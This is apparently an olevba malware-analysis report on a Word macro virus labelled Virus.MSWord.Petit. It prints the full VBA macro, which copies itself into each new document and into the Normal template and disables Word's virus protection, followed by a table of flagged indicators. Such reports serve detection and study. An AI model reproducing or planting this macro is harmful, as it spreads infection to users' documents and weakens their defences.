olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Petit-3bfc85399a55fb93a5e59a993af6089da698d13b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Petit-3bfc85399a55fb93a5e59a993af6089da698d13b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private _
Sub _
AutoNew()
On _
Error _
Resume _
Next
c _
= _
VBE.SelectedVBComponent.CodeModule.Lines(1, _
100)
With _
ActiveDocument.VBProject.VBComponents(1).CodeModule
.DeleteLines 1, _
.countoflines
.AddFromString _
c
End _
With
With _
NormalTemplate.VBProject.VBComponents(1).CodeModule
.DeleteLines _
1, _
.countoflines
.AddFromString _
c
End _
With
Options.VirusProtection _
= 0
End _
Sub






+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

